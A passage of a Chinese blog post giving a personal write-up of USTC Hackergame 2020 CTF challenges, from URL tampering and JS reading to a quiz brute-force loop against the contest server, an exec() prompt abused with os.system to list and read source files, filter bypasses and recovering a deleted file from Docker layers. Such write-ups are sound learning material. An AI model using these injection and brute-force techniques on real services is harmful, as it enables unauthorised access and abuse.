up","date":"2020-11-06 22:00:00","description":"\n<p>作为一只 CS 零基础、信安零基础、CTF 零基础的菜狐狐，苏卡卡今年又来参加 USTC Hackergame 啦！由于一边做题一边总结思路（指写 Write Up），所以苏卡卡应该是第一个发布非官方的 USTC Hackergame 2020 Write Up 的吧（嘿嘿）。</p>\n<blockquote><p>题图来自 USTC Hackergame 2019「Happy LUG」</p></blockquote>\n<span></span><h2>签到题</h2>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.4/1.png\" width=\"508\" height=\"417\"></p>\n<p>只要提取 1 个 flag 就好啦！可是，为什么这个反人类的 <code>form-control</code> 的步长竟然是 0.00001：</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.4/2.png\" width=\"794\" height=\"327\"></p>\n<p>继续看下去会发现，用手是根本不可能拖到 1.00000 的：</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.5/25.png\" width=\"636\" height=\"277\"></p>\n<p>不管了，直接点击「提取」：</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.4/3.png\" width=\"482\" height=\"393\"></p>\n<p>同时，发现地址栏里的 URL 变成了 <code>http://202.38.93.111:10000/?number=0.84608</code>。那就立刻访问 <code>http://202.38.93.111:10000/?number=1</code> 拿到 flag！</p>\n<blockquote><p>Google 从 Chrome 76 起开始推行 WHATWG URL 规范中的「<a href=\"https://url.spec.whatwg.org/#url-rendering-simplification\">Simplify non-human-readable or irrelevant components</a>」、即「简化非人类可读或不相关的组件」。不过 Chrome 85 起提供了「Always Show Full URLs」的选项，可以在地址栏上右键后从菜单中开启。</p></blockquote>\n<h2>猫咪问答++</h2>\n<blockquote><ol>\n<li>以下编程语言、软件或组织对应标志是哺乳动物的有几个？<br>Docker，Golang，Python，Plan 9，PHP，GNU，LLVM，Swift，Perl，GitHub，TortoiseSVN，FireFox，MySQL，PostgreSQL，MariaDB，Linux，OpenBSD，FreeDOS，Apache Tomcat，Squid，openSUSE，Kali，Xfce.<br>提示：学术上一般认为龙不属于哺乳动物。</li>\n<li>第一个以信鸽为载体的 IP 网络标准的 RFC 文档中推荐使用的 MTU (Maximum Transmission Unit) 是多少毫克？<br>提示：咕咕咕，咕咕咕。</li>\n<li>USTC Linux 用户协会在 2019 年 9 月 21 日自由软件日活动中介绍的开源游戏的名称共有几个字母？<br>提示：活动记录会在哪里？</li>\n<li>中国科学技术大学西校区图书馆正前方（西南方向） 50 米 L 型灌木处共有几个连通的划线停车位？<br>提示：建议身临其境。</li>\n<li>中国科学技术大学第六届信息安全大赛所有人合计提交了多少次 flag？<br>提示：是一个非负整数。</li>\n</ol></blockquote>\n<p>其中，第二题、第三题、第五题的答案分别可以在下述 URL 中找到：</p>\n<ul>\n<li>\n<a href=\"https://tools.ietf.org/html/rfc1149\">RFC1149 - A Standard for the Transmission of IP Datagrams on Avian Carriers</a>：信鸽的典型 MTU 是 256 毫克</li>\n<li>\n<a href=\"https://news.ustclug.org/2019/09/2019-sfd-ustc/\">2019 软件自由日中国科大站 - USTC LUG</a>：开源游戏的名称是 Teeworlds、有 9 个字母</li>\n<li><a href=\"https://news.ustclug.org/2019/12/hackergame-2019/\">中国科学技术大学第六届信息安全大赛圆满结束 - USTC LUG</a></li>\n</ul>\n<p>至于第一题要搜索二十几种吉祥物、一不小心还会数错，第四题要去找卫星图像或者街景图，大尾巴狐狸太懒了、不想搜索了！有没有别的方法获取 flag？</p>\n<p>第一题给了 23 种编程语言、软件或组织：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-string\">\"Docker，Golang，Python，Plan 9，PHP，GNU，LLVM，Swift，Perl，GitHub，TortoiseSVN，FireFox，MySQL，PostgreSQL，MariaDB，Linux，OpenBSD，FreeDOS，Apache Tomcat，Squid，openSUSE，Kali，Xfce\"</span>.<span class=\"hljs-title function_\">split</span>(<span class=\"hljs-string\">'，'</span>).<span class=\"hljs-property\">length</span><span class=\"hljs-comment\">// 23</span></code></pre>\n<p>至于图书馆前的地上停车位、总不可能超过 100 个吧？</p>\n<p>那么，写一个遍历跑第一题和第四题的答案，总会跑出 Flag 的！</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">let</span> i = <span class=\"hljs-number\">1</span>; i &lt; <span class=\"hljs-number\">23</span>; i++) { <span class=\"hljs-comment\">// 至少有 1 种哺乳动物；既然提示了龙不是哺乳动物，那么肯定不会 23 种前部都是</span>  <span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">let</span> j = <span class=\"hljs-number\">0</span>; j &lt; <span class=\"hljs-number\">100</span>; j++) { <span class=\"hljs-comment\">// 一个停车位都没有的可能性不是没有，遍历时要考虑进去</span>    <span class=\"hljs-keyword\">const</span> formData = <span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">FormData</span>();    formData.<span class=\"hljs-title function_\">append</span>(<span class=\"hljs-string\">'q1'</span>, i);    formData.<span class=\"hljs-title function_\">append</span>(<span class=\"hljs-string\">'q2'</span>, <span class=\"hljs-number\">256</span>);    formData.<span class=\"hljs-title function_\">append</span>(<span class=\"hljs-string\">'q3'</span>, <span class=\"hljs-number\">9</span>);    formData.<span class=\"hljs-title function_\">append</span>(<span class=\"hljs-string\">'q4'</span>, j);    formData.<span class=\"hljs-title function_\">append</span>(<span class=\"hljs-string\">'q4'</span>, <span class=\"hljs-number\">17098</span>);    <span class=\"hljs-title function_\">fetch</span>(<span class=\"hljs-string\">'http://202.38.93.111:10001/'</span>, {      <span class=\"hljs-attr\">body</span>: formData,      <span class=\"hljs-attr\">method</span>: <span class=\"hljs-string\">'POST'</span>,    }).<span class=\"hljs-title function_\">then</span>(<span class=\"hljs-function\"><span class=\"hljs-params\">resp</span> =&gt;</span> resp.<span class=\"hljs-title function_\">text</span>()).<span class=\"hljs-title function_\">then</span>(<span class=\"hljs-function\"><span class=\"hljs-params\">text</span> =&gt;</span> {      <span class=\"hljs-keyword\">if</span> (!text.<span class=\"hljs-title function_\">includes</span>(<span class=\"hljs-string\">'没有全部答对，不能给你 flag'</span>)) {        <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(i, j, text);      }    });  }}</code></pre>\n<p>果然，<del>通过对比赛平台的 CC 攻击</del>，很快就把第一题和第四题答案跑出来了：第一题的答案是 12、第四题的答案是 9。输入正确答案提交即可获取 flag。</p>\n<h2>2048</h2>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.4/4.png\" width=\"680\" height=\"888\"></p>\n<p>毫无疑问，这道题如果真的玩到 2048 获取 Flag 是肯定可行的，但是我懒；同样的原因，我也不想对这个网站里每个 JS 都审计一次。既然如此，不如先随便玩玩，看看这道题的 Flag 大概会藏在哪里。</p>\n<p>随便乱敲方向键刻意使 Game Over，DevTools 截获了一个 HTTP 请求、是 <code>html_actuator.js</code> 第 164 行发起的：</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.4/5.png\" width=\"1862\" height=\"712\"></p>\n<p>现在我们直接审计 <code>html_actuator.js</code> 就好了，把发起 AJAX 请求的函数找出来：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-title class_\">HTMLActuator</span>.<span class=\"hljs-property\"><span class=\"hljs-keyword\">prototype</span></span>.<span class=\"hljs-property\">message</span> = <span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">won</span>) {  <span class=\"hljs-keyword\">var</span> type    = won ? <span class=\"hljs-string\">\"game-won\"</span> : <span class=\"hljs-string\">\"game-over\"</span>;  <span class=\"hljs-keyword\">var</span> message = won ? <span class=\"hljs-string\">\"FLXG 大成功！\"</span> : <span class=\"hljs-string\">\"FLXG 永不放弃！\"</span>;  <span class=\"hljs-keyword\">var</span> url;  <span class=\"hljs-keyword\">if</span> (won) {    url = <span class=\"hljs-string\">\"/getflxg?my_favorite_fruit=\"</span> + (<span class=\"hljs-string\">'b'</span>+<span class=\"hljs-string\">'a'</span>+ +<span class=\"hljs-string\">'a'</span>+<span class=\"hljs-string\">'a'</span>).<span class=\"hljs-title function_\">toLowerCase</span>();  } <span class=\"hljs-keyword\">else</span> {    url = <span class=\"hljs-string\">\"/getflxg?my_favorite_fruit=\"</span>;  }  <span class=\"hljs-keyword\">let</span> request = <span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">XMLHttpRequest</span>();  request.<span class=\"hljs-title function_\">open</span>(<span class=\"hljs-string\">'GET'</span>, url);  request.<span class=\"hljs-property\">responseType</span> = <span class=\"hljs-string\">'text'</span>;  request.<span class=\"hljs-property\">onload</span> = <span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>) {    <span class=\"hljs-variable language_\">document</span>.<span class=\"hljs-title function_\">getElementById</span>(<span class=\"hljs-string\">\"game-message-extra\"</span>).<span class=\"hljs-property\">innerHTML</span> = request.<span class=\"hljs-property\">response</span>;  };  request.<span class=\"hljs-title function_\">send</span>();  <span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">messageContainer</span>.<span class=\"hljs-property\">classList</span>.<span class=\"hljs-title function_\">add</span>(type);  <span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">messageContainer</span>.<span class=\"hljs-title function_\">getElementsByTagName</span>(<span class=\"hljs-string\">\"p\"</span>)[<span class=\"hljs-number\">0</span>].<span class=\"hljs-property\">textContent</span> = message;  <span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-title function_\">clearContainer</span>(<span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">sharingContainer</span>);  <span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">sharingContainer</span>.<span class=\"hljs-title function_\">appendChild</span>(<span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-title function_\">scoreTweetButton</span>());};</code></pre>\n<p>看了代码就知道怎么获取 Flag 了，直接 GET <code>/getflxg?my_favorite_fruit=banana</code> 即可。</p>\n<blockquote><p>小彩蛋，在 JavaScript 中字符串类型 <code>String</code> 转换成数字类型 <code>Number</code> 时会得到 <code>NaN</code>，凑成了 <code>banana</code>。</p></blockquote>\n<h2>一闪而过的 Flag</h2>\n<blockquote>\n<p>...... <strong>程序每次运行时隐约可见黑色控制台上有 flag 一闪而过。</strong></p>\n<p>......</p>\n<p>而你作为一名新生，不由动了恻隐之心。望着诗人潇洒远去的背影，你可以赶在下午诗人回来之前，帮助这位可怜的人，用 flag 装满他的饭盒吗?</p>\n<p><a href=\"https://archive.org/details/untitled-01_exe\">打开/下载题目</a> （Hosted at Internet Archive）</p>\n</blockquote>\n<p>欺负苏卡卡用 macOS 不用 Windows，哼！苏卡卡才不会重启到 Windows 就为了看个 flag 呢，Parallels Desktop 启动！</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.4/21.png\" width=\"1423\" height=\"781\"></p>\n<p>没有什么是截图解决不了的。。。啊，什么？还要区分 <code>i I 1 l</code>？<del>当然是猜 flag 啦</del></p>\n<p>小 Tip，打开 CMD、左上角图标右键、「默认值」，是可以设置「控制台窗口」默认字体和字号的：</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.4/22.png\" width=\"800\" height=\"440\"></p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.4/23.png\" width=\"800\" height=\"440\"></p>\n<p>改了字体以后，这不就分得清清楚楚啦！</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.4/24.png\" width=\"1067\" height=\"586\"></p>\n<h2>从零开始的记账工具人</h2>\n<blockquote>\n<p>如同往常一样，你的 npy 突然丢给你一个购物账单：“我今天买了几个小玩意，你能帮我算一下一共花了多少钱吗？”</p>\n<p>你心想：<del>又双叒叕要开始吃土了</del> 这不是很简单吗？电子表格里面一拖动就算出来了</p>\n<p>只不过拿到账单之后你才注意到，似乎是为了剁手时更加的安心，这次的账单上面的金额全使用了中文大写数字</p>\n<p><strong>注意：请将账单总金额保留小数点后两位，放在 <code>flag{}</code> 中提交，例如总金额为 123.45 元时，你需要提交 <code>flag{123.45}</code></strong></p>\n</blockquote>\n<p>这道题上来继续欺负苏卡卡没有在 macOS 上安装 Office，<del>大尾巴狐狸非常生气</del>。你看 npm 上这个能解析 <code>xlsx</code> 文件的 SheetJS、大写数字转小写的 nzh 还蛮好用的。Node.js 代码如下：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-keyword\">const</span> <span class=\"hljs-variable constant_\">XLSX</span> = <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">'xlsx'</span>); <span class=\"hljs-comment\">// 解析 xlsx 用</span><span class=\"hljs-keyword\">const</span> <span class=\"hljs-title class_\">NzhCN</span> = <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">'nzh/cn'</span>); <span class=\"hljs-comment\">// 大写数字转小写</span><span class=\"hljs-keyword\">const</span> xlsx = <span class=\"hljs-variable constant_\">XLSX</span>.<span class=\"hljs-title function_\">readFile</span>(<span class=\"hljs-string\">'./bills.xlsx'</span>); <span class=\"hljs-comment\">// 当然你要先把 xlsx 文件下载下来</span><span class=\"hljs-keyword\">const</span> data = <span class=\"hljs-variable constant_\">XLSX</span>.<span class=\"hljs-property\">utils</span>.<span class=\"hljs-title function_\">sheet_to_json</span>(xlsx.<span class=\"hljs-property\">Sheets</span>[xlsx.<span class=\"hljs-property\">SheetNames</span>[<span class=\"hljs-number\">0</span>]]);<span class=\"hljs-keyword\">let</span> count = <span class=\"hljs-number\">0</span>;data.<span class=\"hljs-title function_\">forEach</span>(<span class=\"hljs-function\"><span class=\"hljs-params\">row</span> =&gt;</span> {  <span class=\"hljs-keyword\">const</span> moneyData = { <span class=\"hljs-attr\">yuan</span>: <span class=\"hljs-number\">0</span>, <span class=\"hljs-attr\">jiao</span>: <span class=\"hljs-number\">0</span>, <span class=\"hljs-attr\">fen</span>: <span class=\"hljs-number\">0</span> };  <span class=\"hljs-comment\">// nzh 不支持处理金额，需要自己实现一个</span>  <span class=\"hljs-keyword\">let</span> tmp;  [[<span class=\"hljs-string\">'元'</span>, <span class=\"hljs-string\">'yuan'</span>], [<span class=\"hljs-string\">'角'</span>, <span class=\"hljs-string\">'jiao'</span>], [<span class=\"hljs-string\">'分'</span>, <span class=\"hljs-string\">'fen'</span>]].<span class=\"hljs-title function_\">forEach</span>(<span class=\"hljs-function\">(<span class=\"hljs-params\">[i, dataKey]</span>) =&gt;</span> {    tmp = (tmp || row[<span class=\"hljs-string\">'单价'</span>]).<span class=\"hljs-title function_\">split</span>(i);    <span class=\"hljs-keyword\">if</span> (tmp.<span class=\"hljs-property\">length</span> === <span class=\"hljs-number\">1</span>) {      tmp = tmp[<span class=\"hljs-number\">0</span>]    } <span class=\"hljs-keyword\">else</span> {      moneyData[dataKey] = <span class=\"hljs-title class_\">NzhCN</span>.<span class=\"hljs-title function_\">decodeB</span>(tmp[<span class=\"hljs-number\">0</span>]);      tmp = tmp[<span class=\"hljs-number\">1</span>]    }  });  <span class=\"hljs-comment\">// 处理金额时，要小心浮点数大坑哟</span>  <span class=\"hljs-keyword\">const</span> value = moneyData.<span class=\"hljs-property\">yuan</span> * <span class=\"hljs-number\">100</span> + moneyData.<span class=\"hljs-property\">jiao</span> * <span class=\"hljs-number\">10</span> + moneyData.<span class=\"hljs-property\">fen</span>;  count = count + value * row[<span class=\"hljs-string\">'数量'</span>];});<span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-string\">`flag{<span class=\"hljs-subst\">${(count/<span class=\"hljs-number\">100</span>).toFixed(<span class=\"hljs-number\">2</span>)}</span>}`</span>); <span class=\"hljs-comment\">// 直接打印 flag</span></code></pre>\n<h2>超简单的世界模拟器</h2>\n<blockquote>\n<p>......</p>\n<p>你的任务是在生命游戏的世界中，复现出蝴蝶扇动翅膀，引起大洋彼岸风暴的效应。</p>\n<p>通过改变左上角 15x15 的区域，在游戏演化 200 代之后，如果被特殊标注的正方形内的细胞被“清除”，你将会得到对应的 flag：</p>\n<p>“清除”任意一个正方形，你将会得到第一个 flag。同时“清除”两个正方形，你将会得到第二个 flag。</p>\n</blockquote>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.5/26.png\" width=\"919\" height=\"936\"></p>\n<p>在 Google 上搜索「生命游戏」，找到了一个知乎提问和 <a href=\"https://www.conwaylife.com/wiki/Main_Page\">Conway Life Game Wiki</a>。大概了解康威生命游戏是什么后就理解了题目的要求：要在 15x15 的范围内构建一个生命游戏图形、在演化到 200 代之后会清除两个种群。</p>\n<p>第一个 Payload 是一艘最简单的会向右平移「飞船」（这个图形在知乎或是 Life Game Wiki 上都可以被轻易找到），可以直接摧毁第一个种群：</p>\n<pre><code class=\"hljs plaintext\">00000110111101101100011</code></pre>\n<p>第二个 Payload 是我一不小心试出来的，由一个平移的「飞船」和一个沿着斜对角线行走的「滑翔者」共同组成，他们会「擦弹」引发「大爆炸」，在 80 代左右摧毁第一个种群、在 160 代左右摧毁第二个种群：</p>\n<pre><code class=\"hljs plaintext\">0000011011110110110001100001101011</code></pre>\n<h2>从零开始的火星文生活</h2>\n<blockquote>\n<p>......</p>\n<p>L 同学打开附件一看，傻眼了，全都是意义不明的汉字。机智的 L 同学想到 Q 同学平时喜欢使用 <strong>GBK 编码</strong>，也许是打开方式不对。结果用 GBK 打开却看到了一堆夹杂着日语和数字的<strong>火星文</strong>......</p>\n<p>L 同学彻底懵逼了，几经周折，TA 找到了科大最负盛名的火星文专家 (你)。依靠多年的字符编码解码的经验，你可以破译 Q 同学发来的火星文是什么意思吗？</p>\n<p>注：正确的 flag 全部由 <strong>ASCII</strong> 字符组成！</p>\n</blockquote>\n<p>这种 GBK、UTF-8 之间的火星文编码问题，直接给一个 Unix 下的 <strong>万能解法</strong>：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-built_in\">cat</span> gibberish_message.txt | iconv -f utf8 -t gbk | iconv -f utf8 -t latin1 | iconv -f gbk -t utf8</code></pre>\n<p>剩下要做的，就是把全角转换成半角了。</p>\n<h2>自复读的复读机</h2>\n<blockquote>\n<p>能够复读其他程序输出的程序只是普通的复读机。</p>\n<p>顶尖的复读机还应该能复读出自己的源代码。</p>\n<p>什么是国际复读机啊（战术后仰）</p>\n<p>你现在需要编写两个只有一行 Python 代码的顶尖复读机：</p>\n<ul>\n<li>其中一个要输出代码本身的逆序（即所有字符从后向前依次输出）</li>\n<li>另一个是输出代码本身的 sha256 哈希值，十六进制小写</li>\n</ul>\n<p>满足两个条件分别对应了两个 flag。</p>\n<p>快来开始你的复读吧~</p>\n</blockquote>\n<p>访问题目，输出的提示信息是：</p>\n<pre><code class=\"hljs plaintext\">Your one line python code to exec():</code></pre>\n<p>什么，可以 <code>exec()</code> 啊？那大尾巴狐狸直接干坏事了：</p>\n<pre><code class=\"hljs plaintext\">Your one line python code to exec(): import os; os.system(\"ls\")</code></pre>\n<p>发现目录下面有一个 <code>checker.py</code> 和一个 <code>runner.py</code>。接着用 <code>os.system(\"cat *.py\")</code> 获得题目源码：</p>\n<pre><code class=\"hljs python\"><span class=\"hljs-comment\"># checker.py</span><span class=\"hljs-keyword\">import</span> subprocess<span class=\"hljs-keyword\">import</span> hashlib<span class=\"hljs-keyword\">if</span> __name__ == <span class=\"hljs-string\">\"__main__\"</span>:    code = <span class=\"hljs-built_in\">input</span>(<span class=\"hljs-string\">\"Your one line python code to exec(): \"</span>)    <span class=\"hljs-built_in\">print</span>()    <span class=\"hljs-keyword\">if</span> <span class=\"hljs-keyword\">not</span> code:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Code must not be empty\"</span>)        exit(-<span class=\"hljs-number\">1</span>)    p = subprocess.run(        [<span class=\"hljs-string\">\"su\"</span>, <span class=\"hljs-string\">\"nobody\"</span>, <span class=\"hljs-string\">\"-s\"</span>, <span class=\"hljs-string\">\"/bin/bash\"</span>, <span class=\"hljs-string\">\"-c\"</span>, <span class=\"hljs-string\">\"/usr/local/bin/python3 /runner.py\"</span>],        <span class=\"hljs-built_in\">input</span>=code.encode(),        stdout=subprocess.PIPE,    )    <span class=\"hljs-keyword\">if</span> p.returncode != <span class=\"hljs-number\">0</span>:        <span class=\"hljs-built_in\">print</span>()        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Your code did not run successfully\"</span>)        exit(-<span class=\"hljs-number\">1</span>)    output = p.stdout.decode()    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Your code is:\"</span>)    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-built_in\">repr</span>(code))    <span class=\"hljs-built_in\">print</span>()    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Output of your code is:\"</span>)    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-built_in\">repr</span>(output))    <span class=\"hljs-built_in\">print</span>()    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Checking reversed(code) == output\"</span>)    <span class=\"hljs-keyword\">if</span> code[::-<span class=\"hljs-number\">1</span>] == output:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-built_in\">open</span>(<span class=\"hljs-string\">\"/root/flag1\"</span>).read())    <span class=\"hljs-keyword\">else</span>:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Failed!\"</span>)    <span class=\"hljs-built_in\">print</span>()    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Checking sha256(code) == output\"</span>)    <span class=\"hljs-keyword\">if</span> hashlib.sha256(code.encode()).hexdigest() == output:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-built_in\">open</span>(<span class=\"hljs-string\">\"/root/flag2\"</span>).read())    <span class=\"hljs-keyword\">else</span>:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Failed!\"</span>)<span class=\"hljs-comment\"># runner.py</span><span class=\"hljs-built_in\">exec</span>(<span class=\"hljs-built_in\">input</span>())</code></pre>\n<blockquote><p>不要想着直接 <code>exec()</code> 偷 flag 了，你以为这比赛是 ylb 搞的啊？</p></blockquote>\n<p>可以看到「反向复读」的检查中使用了 <code>[::-1]</code> 倒序，所以在构造反向复读的语句中也应该使用 <code>[::-1]</code>。</p>\n<p>首先是构建正向复读的语句，在 Google 中 <del>盲目</del> 搜索的过程中确定了关键词「Quine Python」、找到了 <a href=\"https://www.geeksforgeeks.org/quine-in-python/\">这个网站</a>，介绍了如下语句：</p>\n<pre><code class=\"hljs python\">_=<span class=\"hljs-string\">'_=%r;print (_%%_)'</span>;<span class=\"hljs-built_in\">print</span> (_%_)</code></pre>\n<p>那个网站也给出了这个语句的详细解释，不过简单来说，我们利用了 <code>print</code> 字符格式化、通过 <code>%r</code>（当然也可以用 <code>%s</code>）获得 <code>_</code> 变量的取值；而在 <code>_</code> 变量中使用了 <code>%%</code> 防止 <code>%</code> 被转义。</p>\n<p>既然有了正向复读，稍加改动即可得到反向复读。首先在 <code>print(_&amp;_)</code> 中加上 <code>[::-1]</code> 获得倒叙，同时也要对应修改 <code>_</code> 变量：</p>\n<pre><code class=\"hljs python\">_=<span class=\"hljs-string\">')]1-::[_%%_(tnirp;%r=_'</span>;<span class=\"hljs-built_in\">print</span>(_%_[::-<span class=\"hljs-number\">1</span>])</code></pre>\n<p>信心满满地去提交，结果 Check Failed，发现 <code>print</code> 在结尾带上了换行符。所以再为 <code>print</code>再加上 <code>end=\"\"</code> 即可：</p>\n<pre><code class=\"hljs python\">_=<span class=\"hljs-string\">')\"\"=dne,]1-::[_%%_(tnirp;%r=_'</span>;<span class=\"hljs-built_in\">print</span>(_%_[::-<span class=\"hljs-number\">1</span>],end=<span class=\"hljs-string\">\"\"</span>)</code></pre>\n<p>成功获得第一个 flag。</p>\n<h2>233 同学的字符串工具</h2>\n<blockquote>\n<p>233 同学最近刚刚学会了 Python 的字符串操作，于是写了两个小程序运行在自己的服务器上。这个工具提供两个功能：</p>\n<ul>\n<li>字符串大写工具</li>\n<li>UTF-7 到 UTF-8 转换工具</li>\n</ul>\n<p>除了点击下方的打开题目按钮使用网页终端，你也可以通过 <code>nc 202.38.93.111 10233</code> 命令连接到 233 同学的服务上。你可以在这里看到 233 同学的源代码: <a href=\"https://gist.github.com/SukkaW/80d5c5d30786a758fe1f014d6a48b799#file-string_tool-py\">string_tool.py</a>。</p>\n</blockquote>\n<p>这一道题我先拿到了第二个 flag 后才拿到了第一个 flag。首先在 <code>www.string-function.com</code> 这个网站上找到了 UTF-7 和 ASCII 编码互换表： <a href=\"http://string-functions.com/encodingtable.aspx?encoding=65000&amp;decoding=20127\">UTF-7 =&gt; ASCII</a> <a href=\"http://string-functions.com/encodingtable.aspx?encoding=20127&amp;decoding=65000\">ASCII =&gt; UTF-7</a>，照着表（加上一些简单的推算）将 <code>flag</code> 编码成 <code>+AGYAbABhAGc-</code>、成功拿到第二个 flag。</p>\n<p>获得第二个 flag 以后，决定根据相同的思路去查 Unicode sheet，但是直到后来经过提醒才想起来有「<a href=\"https://en.wikipedia.org/wiki/Orthographic_ligature\">合字</a>」这种神奇的存在，最终利用 <a href=\"https://www.compart.com/en/unicode/U+FB02#UNC_DB\"><code>U+FB02</code></a> 构造出 Payload 获得第一个 flag。</p>\n<h2>233 同学的 Docker</h2>\n<blockquote>\n<p>233 同学在软工课上学到了 Docker 这种方便的东西，于是给自己的字符串工具项目写了一个 Dockerfile。</p>\n<p>但是 233 同学突然发现它不小心把一个私密文件（<code>flag.txt</code>）打包进去了，于是写了一行命令删掉这个文件。</p>\n<p>「既然已经删掉了，应该不会被人找出来吧？」233 想道。</p>\n</blockquote>\n<p>首先让我们 <a href=\"https://hub.docker.com/layers/8b8d3c8324c7/stringtool/latest/images/sha256-aef87a00ad7a4e240e4b475ea265d3818c694034c26ec227d8d4f445f3d93152?context=explore\">看看这个 Docker Image 是怎么构建的</a>（不需要用 image 反推 Dockerfile 这种奇技淫巧，DockerHub 可以直接查看 Public 的 Docker Images 的构建过程），可以发现 233 同学首先把所有文件都添加到 Docker Image 中、再通过 <code>/bin/sh -c rm /code/flag.txt</code> 删除了 <code>flag.txt</code>。</p>\n<p>由于 Docker Image 在构建时每一个 RUN 都会新建一个 Layer，因此即使 233 同学通过 RUN 删掉了 <code>flag.txt</code>，flag 肯定还存在于某个地方，而且「某个地方」就包括本机的 <code>/var/lib/docker/overlay2</code> ：</p>\n<pre><code class=\"hljs bash\">$ docker run 8b8d3c8324c7/stringtool <span class=\"hljs-comment\"># 下载执行 8b8d3c8324c7/stringtool</span>[Redacted]Nothing here... <span class=\"hljs-comment\"># Docker Image 执行的输出</span>$ <span class=\"hljs-built_in\">cd</span> /var/lib/docker/overlay2$ find -name flag.txt./befaa134f7d0cc9e964e7790b7c11dde6d0df3104cd88667f7676e46f409705f/diff/code/flag.txt./8c07cc3c01c52b8cf0684518e68a31bfb1f843392f973fef9add587d554c6fab/diff/code/flag.txt<span class=\"hljs-comment\"># Duang，flag.txt 它出现了</span>$ <span class=\"hljs-built_in\">cd</span> befaa134f7d0cc9e964e7790b7c11dde6d0df3104cd88667f7676e46f409705f/diff/code/$ <span class=\"hljs-built_in\">cat</span> flag.txt<span class=\"hljs-comment\"># flag 到手，嘿嘿</span></code></pre>\n<h2>从零开始的 HTTP 链接</h2>\n<blockquote>\n<p>众所周知，数组下标应当从 0 开始。</p>\n<p>同样的，TCP 端口也应当从 0 开始。为了实践这一点，我们把一个网站架设在服务器的 0 号端口上。</p>\n<p>你能成功连接到 0 号端口并拿到 flag 吗？</p>\n<p><strong>点击下面的打开题目按钮是无法打开网页的，因为普通的浏览器会认为这是无效地址。</strong></p>\n</blockquote>\n<p>TCP/IP 中「端口」这个概念，甚至早于互联网的发明：早在 ARPANET 网中的供电协议中就有 8 个比特用于决定应该由计算机上的哪个程序接收该信息（当时这 8 个比特被称为 AEN、Another Eight Numbers），可以参考我之前翻译的一篇文章「<a href=\"https://blog.skk.moe/post/history-of-url/\">URL 的历史</a>」。现在 TCP 的端口共有 16 个比特（最大支持到 65535）。其中，端口 0 作为保留端口，所以依然是可用的。虽然部分浏览器无法访问，这并不意味着 netcat 不能访问，对吧！</p>\n<p>当然这道题有几个坑点：</p>\n<ol>\n<li>现有发行版中分发的 <code>netcat</code> 都不是「原版」的，试图连接 Port 0 会报「Invalid Port」。因此可以选择直接手撸 Socket、或者更换另一个版本的 <code>netcat</code>。</li>\n<li>就算使用了合适的工具，由于 Darwin 的 XNU Kernel 非常鸡贼地阻止使用端口 0，所以在 macOS 上也依然没法做这道题。我不得不在 codeanywhere 上开了一个 Linux Container 跑这道题。</li>\n</ol>\n<p>和 HTTP/2 基于二进制帧不同，HTTP/0.9、HTTP/1.0、HTTP/1.1 协议都是基于明文的，因此可以手敲 Header：</p>\n<pre><code class=\"hljs bash\">nc 202.38.93.111 0GET / HTTP/1.1Host: 202.38.93.111Connection: close</code></pre>\n<p>接着终端里会打印出来一串 HTML、隐约还可以看见 <code>xterm.js</code>，这不就是 Hackergame 的 Web 端做题界面嘛！由于去年在参与 USTC Hackergame 时就研究过这个界面、已经知道交互是通过 <code>/shell</code> 路径下的 WebSocket 连接实现的。因此直接使用 <a href=\"https://github.com/vi/websocat\">websocat</a> 完成 WebSocket 交互，就和 netcat 一样：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># 如果没有 websocat 的话</span>$ wget https://github.com/vi/websocat/releases/download/v1.6.0/websocat_nossl_amd64-linux$ <span class=\"hljs-built_in\">chmod</span> +x websocat_nossl_amd64-linux<span class=\"hljs-comment\"># 开始获取 Flag</span>$ ./websocat_nossl_amd64-linux ws://202.38.93.111:0/shellPlease input your token: [Redacted]<span class=\"hljs-comment\"># Flag 到手！</span></code></pre>\n<h2>超简陋的 OpenGL 小程序</h2>\n<blockquote>\n<p>年轻人的第一个 OpenGL 